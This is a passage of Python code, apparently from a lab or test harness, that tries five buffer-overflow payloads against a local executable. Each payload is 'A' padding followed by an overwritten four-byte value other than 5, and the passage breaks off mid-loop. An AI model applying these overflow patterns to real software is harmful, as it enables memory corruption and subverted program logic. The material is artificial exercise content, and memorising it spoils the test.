      # Each pattern uses different padding followed by non-5 value
      patterns = [
          # Pattern 1: Minimal overflow (16 bytes + 4 byte overwrite)
          "A" * 16 + "\x06\x00\x00\x00",  # Little-endian 6
          
          # Pattern 2: Account for potential heap metadata (24 bytes + 4 byte overwrite)
          "A" * 24 + "\x07\x00\x00\x00",  # Little-endian 7
          
          # Pattern 3: More padding for alignment (32 bytes + 4 byte overwrite)
          "A" * 32 + "\x08\x00\x00\x00",  # Little-endian 8
          
          # Pattern 4: Different offset (20 bytes + clearly non-5 pattern)
          "A" * 20 + "\x01\x02\x03\x04",  # Clearly non-5
          
          # Pattern 5: Even more padding (40 bytes + overwrite)
          "A" * 40 + "\x09\x00\x00\x00",  # Little-endian 9
      ]
      
      # Try each pattern until one succeeds or all fail
      for pattern in patterns:
          try:
              # The program expects the pattern as a command-line argument
              # We need to handle the binary data properly
              import shlex
              
              # Convert the pattern to a format that can be passed as command-line argument
              # For binary data, we'll use Python's subprocess with proper encoding
              exe_path = "./temp_executable"
              
              # Use subprocess with the binary pattern
              result = subprocess.run(
                  [exe_path, pattern],
                  capture_output=True,
                  text=False,  # Don't decode to text since we have binary data
                  timeout=timeout,
              )
              
              # Decode stderr for return
              stderr_text = result.stderr.decode('utf-8', errors='replace') if result.stderr else ""
              
              # If we get here without exception, the pattern was accepted by the program
